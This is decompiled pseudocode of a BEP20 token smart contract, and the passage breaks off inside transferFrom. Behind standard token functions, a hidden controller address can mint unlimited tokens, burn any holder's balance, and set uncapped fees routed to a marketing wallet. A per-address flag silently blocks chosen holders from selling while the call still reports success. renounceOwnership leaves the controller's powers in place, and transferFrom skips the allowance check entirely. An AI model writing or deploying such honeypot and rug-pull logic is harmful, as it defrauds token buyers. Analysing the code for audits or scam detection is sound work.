contract main {




// =====================  Runtime code  =====================


uint16 stor0;
address stor0; offset 16
address owner;
address controllerAddress;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 sub_24d7a1bd;
mapping of uint256 sub_60a9d675;
address stor6;
uint256 totalSupply;
uint8 decimals;
array of uint256 symbol;
array of uint256 name;
uint256 sub_781a76ca;
uint256 sub_433ca4db;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function sub_24d7a1bd(?) payable {
    return sub_24d7a1bd
}

function decimals() payable {
    return decimals
}

function sub_433ca4db(?) payable {
    return sub_433ca4db
}

function sub_60a9d675(?) payable {
    require calldata.size - 4 >= 32
    return sub_60a9d675[arg1]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function sub_781a76ca(?) payable {
    return sub_781a76ca
}

function getOwner() payable {
    return owner
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function controller() payable {
    return controllerAddress
}

function _fallback() payable {
    revert
}

function sub_0aa7c42d(?) payable {
    require calldata.size - 4 >= 32
    require msg.sender == controllerAddress
    sub_781a76ca = arg1
}

function sub_a77526ed(?) payable {
    require calldata.size - 4 >= 32
    require msg.sender == controllerAddress
    sub_433ca4db = arg1
}

function sub_d96c04c4(?) payable {
    require calldata.size - 4 >= 32
    require msg.sender == controllerAddress
    sub_24d7a1bd = arg1
}

function sub_373da452(?) payable {
    require calldata.size - 4 >= 64
    require msg.sender == controllerAddress
    sub_60a9d675[address(arg1)] = arg2
}

function setMarketingWalletAddress(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == controllerAddress
    stor6 = arg1
}

function changeController(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == controllerAddress
    controllerAddress = arg1
}

function sub_a99f3696(?) payable {
    require calldata.size - 4 >= 64
    require msg.sender == controllerAddress
    balanceOf[address(arg2)] += 10^18 * arg1
    emit Transfer((10^18 * arg1), arg2, 0);
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipRenounced(owner);
    uint16(stor0.field_0) = 57005
    Mask(144, 0, stor0.field_16) = 0
}

function sub_3be43bea(?) payable {
    require calldata.size - 4 >= 64
    require msg.sender == controllerAddress
    require arg1 <= balanceOf[address(arg2)]
    balanceOf[address(arg2)] += -1 * 10^18 * arg1
    balanceOf[0] += 10^18 * arg1
    emit Transfer((10^18 * arg1), arg2, 0);
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg2 <= allowance[address(msg.sender)][address(arg1)]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require allowance[address(msg.sender)][address(arg1)] + arg2 >= allowance[address(msg.sender)][address(arg1)]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if not arg2:
        if sub_60a9d675[address(msg.sender)] == 2:
            if sub_781a76ca <= 0:
                if sub_433ca4db <= 0:
                    require 0 <= arg2
                    require arg2 <= balanceOf[address(msg.sender)]
                    balanceOf[address(msg.sender)] -= arg2
                    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if arg2:
                        require arg2
                        require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                    require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                    balanceOf[stor6] += arg2 * sub_433ca4db / 100
                    emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                    require 0 <= arg2
                    require arg2 * sub_433ca4db / 100 <= arg2
                    require arg2 <= balanceOf[address(msg.sender)]
                    balanceOf[address(msg.sender)] -= arg2
                    require balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100)
                    emit Transfer((arg2 - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
            else:
                if arg2:
                    require arg2
                    require arg2 * sub_781a76ca / arg2 == sub_781a76ca
                require balanceOf[0] + (arg2 * sub_781a76ca / 100) >= balanceOf[0]
                balanceOf[0] += arg2 * sub_781a76ca / 100
                emit Transfer((arg2 * sub_781a76ca / 100), msg.sender, 0);
                if sub_433ca4db <= 0:
                    require arg2 * sub_781a76ca / 100 <= arg2
                    require 0 <= arg2 - (arg2 * sub_781a76ca / 100)
                    require arg2 <= balanceOf[address(msg.sender)]
                    balanceOf[address(msg.sender)] -= arg2
                    require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) >= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100)
                    emit Transfer((arg2 - (arg2 * sub_781a76ca / 100)), msg.sender, arg1);
                else:
                    if arg2:
                        require arg2
                        require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                    require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                    balanceOf[stor6] += arg2 * sub_433ca4db / 100
                    emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                    require arg2 * sub_781a76ca / 100 <= arg2
                    require arg2 * sub_433ca4db / 100 <= arg2 - (arg2 * sub_781a76ca / 100)
                    require arg2 <= balanceOf[address(msg.sender)]
                    balanceOf[address(msg.sender)] -= arg2
                    require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)
                    emit Transfer((arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
    else:
        if sub_24d7a1bd == 1:
            if sub_60a9d675[address(msg.sender)] == 2:
                if sub_781a76ca <= 0:
                    if sub_433ca4db <= 0:
                        require 0 <= arg2
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg2:
                            require arg2
                            require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                        require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg2 * sub_433ca4db / 100
                        emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                        require 0 <= arg2
                        require arg2 * sub_433ca4db / 100 <= arg2
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100)
                        emit Transfer((arg2 - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
                else:
                    if arg2:
                        require arg2
                        require arg2 * sub_781a76ca / arg2 == sub_781a76ca
                    require balanceOf[0] + (arg2 * sub_781a76ca / 100) >= balanceOf[0]
                    balanceOf[0] += arg2 * sub_781a76ca / 100
                    emit Transfer((arg2 * sub_781a76ca / 100), msg.sender, 0);
                    if sub_433ca4db <= 0:
                        require arg2 * sub_781a76ca / 100 <= arg2
                        require 0 <= arg2 - (arg2 * sub_781a76ca / 100)
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100)
                        emit Transfer((arg2 - (arg2 * sub_781a76ca / 100)), msg.sender, arg1);
                    else:
                        if arg2:
                            require arg2
                            require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                        require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg2 * sub_433ca4db / 100
                        emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                        require arg2 * sub_781a76ca / 100 <= arg2
                        require arg2 * sub_433ca4db / 100 <= arg2 - (arg2 * sub_781a76ca / 100)
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)
                        emit Transfer((arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
        else:
            if sub_60a9d675[address(msg.sender)] != 1:
                if sub_781a76ca <= 0:
                    if sub_433ca4db <= 0:
                        require 0 <= arg2
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg2:
                            require arg2
                            require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                        require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg2 * sub_433ca4db / 100
                        emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                        require 0 <= arg2
                        require arg2 * sub_433ca4db / 100 <= arg2
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100)
                        emit Transfer((arg2 - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
                else:
                    if arg2:
                        require arg2
                        require arg2 * sub_781a76ca / arg2 == sub_781a76ca
                    require balanceOf[0] + (arg2 * sub_781a76ca / 100) >= balanceOf[0]
                    balanceOf[0] += arg2 * sub_781a76ca / 100
                    emit Transfer((arg2 * sub_781a76ca / 100), msg.sender, 0);
                    if sub_433ca4db <= 0:
                        require arg2 * sub_781a76ca / 100 <= arg2
                        require 0 <= arg2 - (arg2 * sub_781a76ca / 100)
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100)
                        emit Transfer((arg2 - (arg2 * sub_781a76ca / 100)), msg.sender, arg1);
                    else:
                        if arg2:
                            require arg2
                            require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                        require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg2 * sub_433ca4db / 100
                        emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                        require arg2 * sub_781a76ca / 100 <= arg2
                        require arg2 * sub_433ca4db / 100 <= arg2 - (arg2 * sub_781a76ca / 100)
                        require arg2 <= balanceOf[address(msg.sender)]
                        balanceOf[address(msg.sender)] -= arg2
                        require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)
                        emit Transfer((arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
            else:
                if sub_60a9d675[address(msg.sender)] == 2:
                    if sub_781a76ca <= 0:
                        if sub_433ca4db <= 0:
                            require 0 <= arg2
                            require arg2 <= balanceOf[address(msg.sender)]
                            balanceOf[address(msg.sender)] -= arg2
                            require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2:
                                require arg2
                                require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                            require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                            balanceOf[stor6] += arg2 * sub_433ca4db / 100
                            emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                            require 0 <= arg2
                            require arg2 * sub_433ca4db / 100 <= arg2
                            require arg2 <= balanceOf[address(msg.sender)]
                            balanceOf[address(msg.sender)] -= arg2
                            require balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_433ca4db / 100)
                            emit Transfer((arg2 - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
                    else:
                        if arg2:
                            require arg2
                            require arg2 * sub_781a76ca / arg2 == sub_781a76ca
                        require balanceOf[0] + (arg2 * sub_781a76ca / 100) >= balanceOf[0]
                        balanceOf[0] += arg2 * sub_781a76ca / 100
                        emit Transfer((arg2 * sub_781a76ca / 100), msg.sender, 0);
                        if sub_433ca4db <= 0:
                            require arg2 * sub_781a76ca / 100 <= arg2
                            require 0 <= arg2 - (arg2 * sub_781a76ca / 100)
                            require arg2 <= balanceOf[address(msg.sender)]
                            balanceOf[address(msg.sender)] -= arg2
                            require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) >= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100)
                            emit Transfer((arg2 - (arg2 * sub_781a76ca / 100)), msg.sender, arg1);
                        else:
                            if arg2:
                                require arg2
                                require arg2 * sub_433ca4db / arg2 == sub_433ca4db
                            require balanceOf[stor6] + (arg2 * sub_433ca4db / 100) >= balanceOf[stor6]
                            balanceOf[stor6] += arg2 * sub_433ca4db / 100
                            emit Transfer((arg2 * sub_433ca4db / 100), msg.sender, stor6);
                            require arg2 * sub_781a76ca / 100 <= arg2
                            require arg2 * sub_433ca4db / 100 <= arg2 - (arg2 * sub_781a76ca / 100)
                            require arg2 <= balanceOf[address(msg.sender)]
                            balanceOf[address(msg.sender)] -= arg2
                            require balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100) >= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)
                            emit Transfer((arg2 - (arg2 * sub_781a76ca / 100) - (arg2 * sub_433ca4db / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x7342455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if not arg3:
        if sub_60a9d675[address(arg1)] == 2:
            if sub_781a76ca <= 0:
                if sub_433ca4db <= 0:
                    require 0 <= arg3
                    require arg3 <= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] -= arg3
                    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if arg3:
                        require arg3
                        require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                    require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                    balanceOf[stor6] += arg3 * sub_433ca4db / 100
                    emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                    require 0 <= arg3
                    require arg3 * sub_433ca4db / 100 <= arg3
                    require arg3 <= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] -= arg3
                    require balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100)
                    emit Transfer((arg3 - (arg3 * sub_433ca4db / 100)), arg1, arg2);
            else:
                if arg3:
                    require arg3
                    require arg3 * sub_781a76ca / arg3 == sub_781a76ca
                require balanceOf[0] + (arg3 * sub_781a76ca / 100) >= balanceOf[0]
                balanceOf[0] += arg3 * sub_781a76ca / 100
                emit Transfer((arg3 * sub_781a76ca / 100), arg1, 0);
                if sub_433ca4db <= 0:
                    require arg3 * sub_781a76ca / 100 <= arg3
                    require 0 <= arg3 - (arg3 * sub_781a76ca / 100)
                    require arg3 <= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] -= arg3
                    require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) >= balanceOf[address(arg2)]
                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100)
                    emit Transfer((arg3 - (arg3 * sub_781a76ca / 100)), arg1, arg2);
                else:
                    if arg3:
                        require arg3
                        require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                    require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                    balanceOf[stor6] += arg3 * sub_433ca4db / 100
                    emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                    require arg3 * sub_781a76ca / 100 <= arg3
                    require arg3 * sub_433ca4db / 100 <= arg3 - (arg3 * sub_781a76ca / 100)
                    require arg3 <= balanceOf[address(arg1)]
                    balanceOf[address(arg1)] -= arg3
                    require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)
                    emit Transfer((arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)), arg1, arg2);
    else:
        if sub_24d7a1bd == 1:
            if sub_60a9d675[address(arg1)] == 2:
                if sub_781a76ca <= 0:
                    if sub_433ca4db <= 0:
                        require 0 <= arg3
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg3:
                            require arg3
                            require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                        require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg3 * sub_433ca4db / 100
                        emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                        require 0 <= arg3
                        require arg3 * sub_433ca4db / 100 <= arg3
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100)
                        emit Transfer((arg3 - (arg3 * sub_433ca4db / 100)), arg1, arg2);
                else:
                    if arg3:
                        require arg3
                        require arg3 * sub_781a76ca / arg3 == sub_781a76ca
                    require balanceOf[0] + (arg3 * sub_781a76ca / 100) >= balanceOf[0]
                    balanceOf[0] += arg3 * sub_781a76ca / 100
                    emit Transfer((arg3 * sub_781a76ca / 100), arg1, 0);
                    if sub_433ca4db <= 0:
                        require arg3 * sub_781a76ca / 100 <= arg3
                        require 0 <= arg3 - (arg3 * sub_781a76ca / 100)
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100)
                        emit Transfer((arg3 - (arg3 * sub_781a76ca / 100)), arg1, arg2);
                    else:
                        if arg3:
                            require arg3
                            require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                        require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg3 * sub_433ca4db / 100
                        emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                        require arg3 * sub_781a76ca / 100 <= arg3
                        require arg3 * sub_433ca4db / 100 <= arg3 - (arg3 * sub_781a76ca / 100)
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)
                        emit Transfer((arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)), arg1, arg2);
        else:
            if sub_60a9d675[address(arg1)] != 1:
                if sub_781a76ca <= 0:
                    if sub_433ca4db <= 0:
                        require 0 <= arg3
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg3:
                            require arg3
                            require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                        require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg3 * sub_433ca4db / 100
                        emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                        require 0 <= arg3
                        require arg3 * sub_433ca4db / 100 <= arg3
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100)
                        emit Transfer((arg3 - (arg3 * sub_433ca4db / 100)), arg1, arg2);
                else:
                    if arg3:
                        require arg3
                        require arg3 * sub_781a76ca / arg3 == sub_781a76ca
                    require balanceOf[0] + (arg3 * sub_781a76ca / 100) >= balanceOf[0]
                    balanceOf[0] += arg3 * sub_781a76ca / 100
                    emit Transfer((arg3 * sub_781a76ca / 100), arg1, 0);
                    if sub_433ca4db <= 0:
                        require arg3 * sub_781a76ca / 100 <= arg3
                        require 0 <= arg3 - (arg3 * sub_781a76ca / 100)
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100)
                        emit Transfer((arg3 - (arg3 * sub_781a76ca / 100)), arg1, arg2);
                    else:
                        if arg3:
                            require arg3
                            require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                        require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                        balanceOf[stor6] += arg3 * sub_433ca4db / 100
                        emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                        require arg3 * sub_781a76ca / 100 <= arg3
                        require arg3 * sub_433ca4db / 100 <= arg3 - (arg3 * sub_781a76ca / 100)
                        require arg3 <= balanceOf[address(arg1)]
                        balanceOf[address(arg1)] -= arg3
                        require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)
                        emit Transfer((arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)), arg1, arg2);
            else:
                if sub_60a9d675[address(arg1)] == 2:
                    if sub_781a76ca <= 0:
                        if sub_433ca4db <= 0:
                            require 0 <= arg3
                            require arg3 <= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] -= arg3
                            require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg3:
                                require arg3
                                require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                            require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                            balanceOf[stor6] += arg3 * sub_433ca4db / 100
                            emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                            require 0 <= arg3
                            require arg3 * sub_433ca4db / 100 <= arg3
                            require arg3 <= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] -= arg3
                            require balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_433ca4db / 100)
                            emit Transfer((arg3 - (arg3 * sub_433ca4db / 100)), arg1, arg2);
                    else:
                        if arg3:
                            require arg3
                            require arg3 * sub_781a76ca / arg3 == sub_781a76ca
                        require balanceOf[0] + (arg3 * sub_781a76ca / 100) >= balanceOf[0]
                        balanceOf[0] += arg3 * sub_781a76ca / 100
                        emit Transfer((arg3 * sub_781a76ca / 100), arg1, 0);
                        if sub_433ca4db <= 0:
                            require arg3 * sub_781a76ca / 100 <= arg3
                            require 0 <= arg3 - (arg3 * sub_781a76ca / 100)
                            require arg3 <= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] -= arg3
                            require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) >= balanceOf[address(arg2)]
                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100)
                            emit Transfer((arg3 - (arg3 * sub_781a76ca / 100)), arg1, arg2);
                        else:
                            if arg3:
                                require arg3
                                require arg3 * sub_433ca4db / arg3 == sub_433ca4db
                            require balanceOf[stor6] + (arg3 * sub_433ca4db / 100) >= balanceOf[stor6]
                            balanceOf[stor6] += arg3 * sub_433ca4db / 100
                            emit Transfer((arg3 * sub_433ca4db / 100), arg1, stor6);
                            require arg3 * sub_781a76ca / 100 <= arg3
                            require arg3 * sub_433ca4db / 100 <= arg3 - (arg3 * sub_781a76ca / 100)
                            require arg3 <= balanceOf[address(arg1)]
                            balanceOf[address(arg1)] -= arg3
